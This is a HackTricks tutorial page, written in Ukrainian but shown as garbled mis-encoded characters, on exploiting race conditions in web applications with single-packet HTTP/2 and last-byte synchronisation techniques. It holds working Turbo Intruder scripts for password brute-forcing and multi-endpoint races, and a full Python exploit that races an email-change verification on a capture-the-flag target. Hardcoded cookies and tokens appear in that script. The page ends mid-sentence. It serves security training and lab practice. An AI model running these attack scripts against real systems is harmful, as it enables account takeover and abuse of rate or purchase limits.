# Race Condition

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition), —â–æ–± –ª–µ–≥–∫–æ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ —Ç–∞ **–∞–≤—Ç–æ–º–∞—Ç–∏–∑—É–≤–∞—Ç–∏ —Ä–æ–±–æ—á—ñ –ø—Ä–æ—Ü–µ—Å–∏**, —è–∫—ñ –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å—Å—è **–Ω–∞–π—Å—É—á–∞—Å–Ω—ñ—à–∏–º–∏** —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏ —Å–ø—ñ–ª—å–Ω–æ—Ç–∏.\
–û—Ç—Ä–∏–º–∞–π—Ç–µ –¥–æ—Å—Ç—É–ø —Å—å–æ–≥–æ–¥–Ω—ñ:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

{% hint style="warning" %}
–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –≥–ª–∏–±–æ–∫–æ–≥–æ —Ä–æ–∑—É–º—ñ–Ω–Ω—è —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π –∑–≤—ñ—Ç –∑–∞ –∞–¥—Ä–µ—Å–æ—é [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## –ü–æ–∫—Ä–∞—â–µ–Ω–Ω—è –∞—Ç–∞–∫ –Ω–∞ Race Condition

–û—Å–Ω–æ–≤–Ω–æ—é –ø–µ—Ä–µ—à–∫–æ–¥–æ—é –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è race conditions —î –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –æ–¥–Ω–æ—á–∞—Å–Ω–æ—ó –æ–±—Ä–æ–±–∫–∏ –∫—ñ–ª—å–∫–æ—Ö –∑–∞–ø–∏—Ç—ñ–≤ –∑ **–¥—É–∂–µ –Ω–µ–∑–Ω–∞—á–Ω–æ—é —Ä—ñ–∑–Ω–∏—Ü–µ—é –≤ —ó—Ö —á–∞—Å—ñ –æ–±—Ä–æ–±–∫–∏ ‚Äî —ñ–¥–µ–∞–ª—å–Ω–æ, –º–µ–Ω—à–µ 1 –º—Å**.

–¢—É—Ç –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –¥–µ—è–∫—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ –¥–ª—è —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó –∑–∞–ø–∏—Ç—ñ–≤:

#### HTTP/2 –û–¥–Ω–æ–ø–∞–∫–µ—Ç–Ω–∞ –∞—Ç–∞–∫–∞ –ø—Ä–æ—Ç–∏ HTTP/1.1 –°–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è –æ—Å—Ç–∞–Ω–Ω—å–æ–≥–æ –±–∞–π—Ç–∞

* **HTTP/2**: –ü—ñ–¥—Ç—Ä–∏–º—É—î –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è –¥–≤–æ—Ö –∑–∞–ø–∏—Ç—ñ–≤ —á–µ—Ä–µ–∑ –æ–¥–Ω–µ TCP-–∑'—î–¥–Ω–∞–Ω–Ω—è, –∑–º–µ–Ω—à—É—é—á–∏ –≤–ø–ª–∏–≤ –º–µ—Ä–µ–∂–µ–≤–æ–≥–æ –¥–∂–∏—Ç—Ç–µ—Ä–∞. –û–¥–Ω–∞–∫ —á–µ—Ä–µ–∑ –≤–∞—Ä—ñ–∞—Ü—ñ—ó –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞ –¥–≤–∞ –∑–∞–ø–∏—Ç–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –Ω–µ–¥–æ—Å—Ç–∞—Ç–Ω—ñ–º–∏ –¥–ª—è –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—ó –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó race condition.
* **HTTP/1.1 '–°–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è –æ—Å—Ç–∞–Ω–Ω—å–æ–≥–æ –±–∞–π—Ç–∞'**: –î–æ–∑–≤–æ–ª—è—î –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ –±—ñ–ª—å—à—ñ—Å—Ç—å —á–∞—Å—Ç–∏–Ω 20-30 –∑–∞–ø–∏—Ç—ñ–≤, —É—Ç—Ä–∏–º—É—é—á–∏ –Ω–µ–≤–µ–ª–∏–∫–∏–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç, —è–∫–∏–π –ø–æ—Ç—ñ–º –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è —Ä–∞–∑–æ–º, –¥–æ—Å—è–≥–∞—é—á–∏ –æ–¥–Ω–æ—á–∞—Å–Ω–æ–≥–æ –ø—Ä–∏–±—É—Ç—Ç—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä.

**–ü—ñ–¥–≥–æ—Ç–æ–≤–∫–∞ –¥–æ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó –æ—Å—Ç–∞–Ω–Ω—å–æ–≥–æ –±–∞–π—Ç–∞** –≤–∫–ª—é—á–∞—î:

1. –ù–∞–¥—Å–∏–ª–∞–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤ —Ç–∞ –¥–∞–Ω–∏—Ö —Ç—ñ–ª–∞ –±–µ–∑ –æ—Å—Ç–∞–Ω–Ω—å–æ–≥–æ –±–∞–π—Ç–∞ –±–µ–∑ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è –ø–æ—Ç–æ–∫—É.
2. –ü–∞—É–∑–∞ –Ω–∞ 100 –º—Å –ø—ñ—Å–ª—è –ø–æ—á–∞—Ç–∫–æ–≤–æ–≥–æ –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è.
3. –í–∏–º–∫–Ω–µ–Ω–Ω—è TCP\_NODELAY –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∞–ª–≥–æ—Ä–∏—Ç–º—É –ù–µ–π–≥–ª–∞ –¥–ª—è –ø–∞–∫–µ—Ç—É–≤–∞–Ω–Ω—è —Ñ—ñ–Ω–∞–ª—å–Ω–∏—Ö –∫–∞–¥—Ä—ñ–≤.
4. –ü—ñ–Ω–≥ –¥–ª—è —Ä–æ–∑—ñ–≥—Ä—ñ–≤—É –∑'—î–¥–Ω–∞–Ω–Ω—è.

–ù–∞—Å—Ç—É–ø–Ω–µ –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è —É—Ç—Ä–∏–º—É–≤–∞–Ω–∏—Ö –∫–∞–¥—Ä—ñ–≤ –º–∞—î –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ —ó—Ö –ø—Ä–∏–±—É—Ç—Ç—è –≤ –æ–¥–Ω–æ–º—É –ø–∞–∫–µ—Ç—ñ, —â–æ –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Wireshark. –¶–µ–π –º–µ—Ç–æ–¥ –Ω–µ –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è –¥–æ —Å—Ç–∞—Ç–∏—á–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤, —è–∫—ñ –∑–∞–∑–≤–∏—á–∞–π –Ω–µ –±–µ—Ä—É—Ç—å —É—á–∞—Å—Ç—ñ –≤ –∞—Ç–∞–∫–∞—Ö RC.

### –ê–¥–∞–ø—Ç–∞—Ü—ñ—è –¥–æ –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä–∏ —Å–µ—Ä–≤–µ—Ä–∞

–†–æ–∑—É–º—ñ–Ω–Ω—è –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä–∏ —Ü—ñ–ª—ñ –≤–∞–∂–ª–∏–≤–µ. –§—Ä–æ–Ω—Ç–∞–ª—å–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∏ –º–æ–∂—É—Ç—å –ø–æ-—Ä—ñ–∑–Ω–æ–º—É –º–∞—Ä—à—Ä—É—Ç–∏–∑—É–≤–∞—Ç–∏ –∑–∞–ø–∏—Ç–∏, —â–æ –≤–ø–ª–∏–≤–∞—î –Ω–∞ —á–∞—Å. –ü–æ–ø–µ—Ä–µ–¥–Ω—î —Ä–æ–∑—ñ–≥—Ä—ñ–≤–∞–Ω–Ω—è –∑'—î–¥–Ω–∞–Ω–Ω—è –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞ —á–µ—Ä–µ–∑ –Ω–µ–∑–Ω–∞—á–Ω—ñ –∑–∞–ø–∏—Ç–∏ –º–æ–∂–µ –Ω–æ—Ä–º–∞–ª—ñ–∑—É–≤–∞—Ç–∏ —á–∞—Å –∑–∞–ø–∏—Ç—ñ–≤.

#### –û–±—Ä–æ–±–∫–∞ –±–ª–æ–∫—É–≤–∞–Ω–Ω—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ —Å–µ—Å—ñ–π

–§—Ä–µ–π–º–≤–æ—Ä–∫–∏, —Ç–∞–∫—ñ —è–∫ –æ–±—Ä–æ–±–Ω–∏–∫ —Å–µ—Å—ñ–π PHP, —Å–µ—Ä—ñ–∞–ª—ñ–∑—É—é—Ç—å –∑–∞–ø–∏—Ç–∏ –∑–∞ —Å–µ—Å—ñ—î—é, —â–æ –º–æ–∂–µ –ø—Ä–∏—Ö–æ–≤—É–≤–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ. –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ä—ñ–∑–Ω–∏—Ö —Ç–æ–∫–µ–Ω—ñ–≤ —Å–µ—Å—ñ—ó –¥–ª—è –∫–æ–∂–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É –º–æ–∂–µ –æ–±—ñ–π—Ç–∏ —Ü—é –ø—Ä–æ–±–ª–µ–º—É.

#### –ü–æ–¥–æ–ª–∞–Ω–Ω—è –æ–±–º–µ–∂–µ–Ω—å —à–≤–∏–¥–∫–æ—Å—Ç—ñ –∞–±–æ —Ä–µ—Å—É—Ä—Å—ñ–≤

–Ø–∫—â–æ —Ä–æ–∑—ñ–≥—Ä—ñ–≤ –∑'—î–¥–Ω–∞–Ω–Ω—è –Ω–µ–µ—Ñ–µ–∫—Ç–∏–≤–Ω–∏–π, –Ω–∞–≤–º–∏—Å–Ω–µ –≤–∏–∫–ª–∏–∫–∞–Ω–Ω—è –∑–∞—Ç—Ä–∏–º–æ–∫ –æ–±–º–µ–∂–µ–Ω—å —à–≤–∏–¥–∫–æ—Å—Ç—ñ –∞–±–æ —Ä–µ—Å—É—Ä—Å—ñ–≤ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä—ñ–≤ —á–µ—Ä–µ–∑ –ø–æ—Ç—ñ–∫ —Ñ–∞–ª—å—à–∏–≤–∏—Ö –∑–∞–ø–∏—Ç—ñ–≤ –º–æ–∂–µ –ø–æ–ª–µ–≥—à–∏—Ç–∏ –æ–¥–Ω–æ–ø–∞–∫–µ—Ç–Ω—É –∞—Ç–∞–∫—É, –≤–∏–∫–ª–∏–∫–∞–≤—à–∏ –∑–∞—Ç—Ä–∏–º–∫—É –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞, —Å–ø—Ä–∏—è—Ç–ª–∏–≤—É –¥–ª—è race conditions.

## –ü—Ä–∏–∫–ª–∞–¥–∏ –∞—Ç–∞–∫

* **Tubo Intruder - –æ–¥–Ω–æ–ø–∞–∫–µ—Ç–Ω–∞ –∞—Ç–∞–∫–∞ HTTP2 (1 –∫—ñ–Ω—Ü–µ–≤–∞ —Ç–æ—á–∫–∞)**: –í–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∑–∞–ø–∏—Ç –¥–æ **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –≤ –∑–∞–ø–∏—Ç—ñ –∑–Ω–∞—á–µ–Ω–Ω—è, —è–∫–µ —Ö–æ—á–µ—Ç–µ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∏—Ç–∏ –¥–ª—è **`%s`**, —è–∫ —É `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`, –∞ –ø–æ—Ç—ñ–º –≤–∏–±—Ä–∞—Ç–∏ **`examples/race-single-packer-attack.py`** –∑ –≤–∏–ø–∞–¥–∞—é—á–æ–≥–æ —Å–ø–∏—Å–∫—É:

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

–Ø–∫—â–æ –≤–∏ –∑–±–∏—Ä–∞—î—Ç–µ—Å—è **–Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ —Ä—ñ–∑–Ω—ñ –∑–Ω–∞—á–µ–Ω–Ω—è**, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –∫–æ–¥ –Ω–∞ —Ü–µ–π, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Å–ª–æ–≤–Ω–∏–∫ –∑ –±—É—Ñ–µ—Ä–∞ –æ–±–º—ñ–Ω—É:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
–Ø–∫—â–æ –≤–µ–± –Ω–µ –ø—ñ–¥—Ç—Ä–∏–º—É—î HTTP2 (—Ç—ñ–ª—å–∫–∏ HTTP1.1), –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `Engine.THREADED` –∞–±–æ `Engine.BURP` –∑–∞–º—ñ—Å—Ç—å `Engine.BURP2`.
{% endhint %}

* **Tubo Intruder - HTTP2 –∞—Ç–∞–∫–∞ –∑ –æ–¥–Ω–∏–º –ø–∞–∫–µ—Ç–æ–º (–ö—ñ–ª—å–∫–∞ –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫)**: –£ –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∑–∞–ø–∏—Ç –¥–æ 1 –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏, –∞ –ø–æ—Ç—ñ–º –∫—ñ–ª—å–∫–∞ –¥–æ —ñ–Ω—à–∏—Ö –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫, —â–æ–± –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ RCE, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ —Å–∫—Ä–∏–ø—Ç `race-single-packet-attack.py` –Ω–∞ —â–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* –í—ñ–Ω —Ç–∞–∫–æ–∂ –¥–æ—Å—Ç—É–ø–Ω–∏–π —É **Repeater** —á–µ—Ä–µ–∑ –Ω–æ–≤—É –æ–ø—Ü—ñ—é '**Send group in parallel**' —É Burp Suite.
* –î–ª—è **limit-overrun** –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –¥–æ–¥–∞—Ç–∏ **–æ–¥–∏–Ω —ñ —Ç–æ–π –∂–µ –∑–∞–ø–∏—Ç 50 —Ä–∞–∑—ñ–≤** —É –≥—Ä—É–ø—É.
* –î–ª—è **connection warming** –≤–∏ –º–æ–∂–µ—Ç–µ **–¥–æ–¥–∞—Ç–∏** –Ω–∞ **–ø–æ—á–∞—Ç–∫—É** **–≥—Ä—É–ø–∏** –∫—ñ–ª—å–∫–∞ **–∑–∞–ø–∏—Ç—ñ–≤** –¥–æ –¥–µ—è–∫–æ—ó –Ω–µ—Å—Ç–∞—Ç–∏—á–Ω–æ—ó —á–∞—Å—Ç–∏–Ω–∏ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞.
* –î–ª—è **delaying** –ø—Ä–æ—Ü–µ—Å—É **–º—ñ–∂** –æ–±—Ä–æ–±–∫–æ—é **–æ–¥–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É —Ç–∞ —ñ–Ω—à–æ–≥–æ** –≤ 2 –ø—ñ–¥—Å—Ç–∞–Ω–∞—Ö, –≤–∏ –º–æ–∂–µ—Ç–µ **–¥–æ–¥–∞—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –∑–∞–ø–∏—Ç–∏ –º—ñ–∂** –æ–±–æ–º–∞ –∑–∞–ø–∏—Ç–∞–º–∏.
* –î–ª—è **multi-endpoint** RC –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ—á–∞—Ç–∏ –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ **–∑–∞–ø–∏—Ç**, —è–∫–∏–π **–ø–µ—Ä–µ–π–¥–µ –≤ –ø—Ä–∏—Ö–æ–≤–∞–Ω–∏–π —Å—Ç–∞–Ω**, –∞ –ø–æ—Ç—ñ–º **50 –∑–∞–ø–∏—Ç—ñ–≤** –æ–¥—Ä–∞–∑—É –ø—ñ—Å–ª—è –Ω—å–æ–≥–æ, —è–∫—ñ **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –ø—Ä–∏—Ö–æ–≤–∞–Ω–∏–π —Å—Ç–∞–Ω**.

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

* **–ê–≤—Ç–æ–º–∞—Ç–∏–∑–æ–≤–∞–Ω–∏–π python-—Å–∫—Ä–∏–ø—Ç**: –ú–µ—Ç–∞ —Ü—å–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ–± –∑–º—ñ–Ω–∏—Ç–∏ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –ø–æ—à—Ç—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –ø–æ—Å—Ç—ñ–π–Ω–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏ —ó—ó, –ø–æ–∫–∏ —Ç–æ–∫–µ–Ω –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –Ω–æ–≤–æ—ó –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—ó –ø–æ—à—Ç–∏ –Ω–µ –Ω–∞–¥—ñ–π–¥–µ –Ω–∞ –æ—Å—Ç–∞–Ω–Ω—é –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –ø–æ—à—Ç—É (—Ü–µ –ø–æ–≤'—è–∑–∞–Ω–æ –∑ —Ç–∏–º, —â–æ –≤ –∫–æ–¥—ñ —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞–ª–∞—Å—è RC, –¥–µ –±—É–ª–æ –º–æ–∂–ª–∏–≤–æ –∑–º—ñ–Ω–∏—Ç–∏ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –ø–æ—à—Ç—É, –∞–ª–µ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –Ω–∞–¥—Å–∏–ª–∞–ª–æ—Å—è –Ω–∞ —Å—Ç–∞—Ä—É, –æ—Å–∫—ñ–ª—å–∫–∏ –∑–º—ñ–Ω–Ω–∞, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É –ø–æ—à—Ç—É, –≤–∂–µ –±—É–ª–∞ –∑–∞–ø–æ–≤–Ω–µ–Ω–∞ –ø–µ—Ä—à–æ—é).\
–ö–æ–ª–∏ —Å–ª–æ–≤–æ "objetivo" –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –æ—Ç—Ä–∏–º–∞–Ω–∏—Ö –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–∏—Ö –ª–∏—Å—Ç–∞—Ö, –º–∏ –∑–Ω–∞—î–º–æ, —â–æ –æ—Ç—Ä–∏–º–∞–ª–∏ —Ç–æ–∫–µ–Ω –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –∑–º—ñ–Ω–µ–Ω–æ—ó –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—ó –ø–æ—à—Ç–∏, —ñ –º–∏ –∑–∞–∫—ñ–Ω—á—É—î–º–æ –∞—Ç–∞–∫—É.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### –ü–æ–ª—ñ–ø—à–µ–Ω–Ω—è –∞—Ç–∞–∫–∏ –∑ –æ–¥–Ω–æ–≥–æ –ø–∞–∫–µ—Ç–∞

–£ –ø–æ—á–∞—Ç–∫–æ–≤–æ–º—É –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—ñ –ø–æ—è—Å–Ω—é—î—Ç—å—Å—è, —â–æ —Ü—è –∞—Ç–∞–∫–∞ –º–∞—î –æ–±–º–µ–∂–µ–Ω–Ω—è –≤ 1,500 –±–∞–π—Ç. –û–¥–Ω–∞–∫ —É [**—Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/) –ø–æ—è—Å–Ω—é—î—Ç—å—Å—è, —è–∫ –º–æ–∂–ª–∏–≤–æ —Ä–æ–∑—à–∏—Ä–∏—Ç–∏ –æ–±–º–µ–∂–µ–Ω–Ω—è –≤ 1,500 –±–∞–π—Ç –∞—Ç–∞–∫–∏ –∑ –æ–¥–Ω–æ–≥–æ –ø–∞–∫–µ—Ç–∞ –¥–æ **65,535 B –≤—ñ–∫–æ–Ω–Ω–æ–≥–æ –æ–±–º–µ–∂–µ–Ω–Ω—è TCP, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∞—Ü—ñ—é –Ω–∞ —Ä—ñ–≤–Ω—ñ IP** (—Ä–æ–∑–¥—ñ–ª–µ–Ω–Ω—è –æ–¥–Ω–æ–≥–æ –ø–∞–∫–µ—Ç–∞ –Ω–∞ –∫—ñ–ª—å–∫–∞ IP-–ø–∞–∫–µ—Ç—ñ–≤) —ñ –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è —ó—Ö —É —Ä—ñ–∑–Ω–æ–º—É –ø–æ—Ä—è–¥–∫—É, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –ø–æ–≤—Ç–æ—Ä–Ω—ñ–π –∑–±—ñ—Ä—Ü—ñ 